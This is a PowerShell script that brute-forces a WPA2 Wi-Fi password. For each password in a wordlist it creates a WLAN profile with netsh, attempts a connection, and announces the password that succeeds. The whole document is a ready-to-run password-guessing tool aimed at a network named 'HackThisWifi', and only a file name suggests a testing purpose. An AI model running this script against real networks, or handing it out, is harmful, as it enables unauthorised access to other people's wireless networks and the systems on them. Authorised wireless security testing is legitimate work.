$ssid = "HackThisWifi"
$password_list = "passwords.txt"

Write-Host "Creating Wi-Fi profile for $ssid..."

foreach ($password in Get-Content $password_list) {
    Write-Host "Setting key to $password..."
    $xml = '<?xml version="1.0"?><WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"><name>'+$ssid+'</name><SSIDConfig><SSID><hex>4861636B5468697357696669</hex><name>'+$ssid+'</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>'+$password+'</keyMaterial></sharedKey></security></MSM></WLANProfile>'
    Set-Content -Path "C:\Users\P\Downloads\SecurityTesting.xml" -Value $xml
    Write-Host ""
    Get-Content "C:\Users\P\Downloads\SecurityTesting.xml"
    netsh wlan add profile filename="C:\Users\P\Downloads\SecurityTesting.xml" interface="Wi-Fi"
    netsh wlan connect name="$ssid" 
    Start-Sleep -Seconds 1
    if ((netsh wlan show interfaces) -match "State\s+:\s+connected") {
        Write-Host "Currently connected to a Wi-Fi network" -ForegroundColor Green
        Write-Host "The wifi password of $($password) works on the $($ssid) network" -ForegroundColor Green
    } else {
        Write-Host "Not currently connected to a Wi-Fi network" -ForegroundColor Red
    }
    (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi").IPAddress

    

    netsh wlan disconnect > $null
}

Remove-Item "C:\Users\P\Downloads\SecurityTesting.xml"
Write-Host "Finished testing all passwords in $password_list"
